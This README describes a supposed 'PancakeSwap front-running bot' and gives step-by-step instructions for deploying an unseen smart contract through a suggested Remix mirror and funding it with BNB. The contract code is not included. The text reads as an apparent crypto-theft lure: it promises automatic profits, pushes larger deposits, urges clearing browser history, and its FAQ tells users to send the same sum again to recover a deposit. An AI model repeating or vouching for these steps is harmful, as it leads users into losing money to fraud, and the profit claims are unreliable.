# PancakeSwap-Frontrun-Bot

This was copied from https://www.youtube.com/watch?v=yiH-S5cVo0o and I have not checked it for validity. Here is the instructions provided by the video

The current parameters of this contract are that 10% of profit automatically reenters the pool, and automatically transacts back to your wallet 90% of the profit. The remaining pool keeps running for profit, until you transaction the "Action" function in Remix.

1. Download MetaMask:
https://metamask.io/download.html


2. Connect MetaMask to Binance Smart Chain (use Mainnet):
https://academy.binance.com/en/articl...


3. Access Remix (UPDATED 19/04/2022 - use child version - KLAYTN.COM for better experience): https://ide.klaytn.com/#version=soljs...


4. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: "AutoBot.sol"

5. Paste SmartContract in Remix: https://remix.ethereum.org/

6. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it

7. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now

8. Deposit funds to exact your BOT contract address

9. After your transaction was confirmed, Start the BOT by clicking the "Action" button

//// Important reminder:
1. Since the Bot v1 was leaked, there are many bots are using our source code right now, causing widespread congestion on the BSC network recently (We are very sorry @BSC). And, according to our results in the last week, the current Bot v2 with 1.0 BNB deposit earns up to 250~300% better return than the old Bot v1 generation (with 0.4~0.6 BNB deposit), so we recommend you fund your BNB deposit to 1.0 BNB to ensure competition with other active bots.
If you do not pay attention to the capital limit, you can refer to the description below to return it yourself.
2. Pay attention to the video upload time. If you are fooled by other contracts that imitate my clip robot, for the safety of funds, it is best to create a new wallet and delete the browser browsing history (cookie) before using the code to ensure access to the mixing website. When there is no previously deployed contract information.
3. We will try to upgrade the Bot versions regularly to bring the highest profit possible, so let's subscribe to the channel, or you will be lost the Bot v3 ticket.

//// FAQ [very important, return method of contract funds]
Q1: How to return the BNB deposited in the contract?
A1: Transfer 0.0001bnb [as transfer fee] + previously transferred funds BNB to the previously deployed contract, and then execute the action. For example: after deploying the contract, transfer 1.0 BNB, when you need to return the funds, you need to transfer 1.0 BNB to the contract, and then action, the contract will execute the function of refunding the currency, returning the previous 1.0 BNB, a total of 2.0 BNB to your wallet

Q2: How to continue depositing BNB?
A2: Deposit any BNB greater than 1. The contract has added a protection mechanism. For the purpose of the capital hit rate, if the single time is less than 1 BNB, the contract will be suspended until the required amount is reached. However, if you want to return the funds, you can refer to the description of the previous question.

Q3: What should I do if there is no revenue generated after the contract runs?
A3: You can refer to the previous question. The main reason is that there are less funds deposited. In order to ensure the hit rate, the contract will temporarily refuse the transaction until the required amount is reached. You can choose to refer to Q1 to withdraw funds or add at least 1 BNB.
